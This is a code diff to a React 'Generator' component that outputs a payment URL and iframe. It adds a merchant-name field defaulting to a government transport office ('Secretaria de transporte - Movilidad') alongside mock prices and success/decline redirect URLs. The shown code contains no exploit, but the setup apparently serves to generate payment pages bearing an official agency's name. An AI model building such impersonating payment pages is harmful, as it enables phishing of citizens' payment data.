@@ -44,6 +44,7 @@ const Field: React.FC<FieldProps> = ({ label, value, type = "text", inputMode, o
 
 export default function Generator() {
   const [form, setForm] = useState({ ...MOCK, price: "199900", priceFormatted: "$199.900" });
+  const [comercio, setComercio] = useState("Secretaria de transporte - Movilidad © 2026");
   const [redirectSuccess, setRedirectSuccess] = useState("https://tienda.example/pago-ok");
   const [redirectDeclined, setRedirectDeclined] = useState("https://tienda.example/tarjeta-declinada");
   const [result, setResult] = useState<{ url: string; iframe: string } | null>(null);
@@ -116,6 +117,7 @@ export default function Generator() {
           },
           price: form.price,
           priceFormatted: form.priceFormatted,
+          comercio,
           redirectSuccess,
           redirectDeclined,
         }),
@@ -165,6 +167,7 @@ export default function Generator() {
         </div>
 
         <div className="mt-4 grid grid-cols-1 gap-3 rounded-lg border border-slate-200 bg-white p-4">
+          <Field label="Nombre del comercio (comercio)" value={comercio} onChange={(e) => setComercio(e.target.value)} />
           <Field label="URL de éxito (redirectSuccess)" value={redirectSuccess} onChange={(e) => setRedirectSuccess(e.target.value)} />
           <Field label="URL de declinado (redirectDeclined)" value={redirectDeclined} onChange={(e) => setRedirectDeclined(e.target.value)} />
         </div>
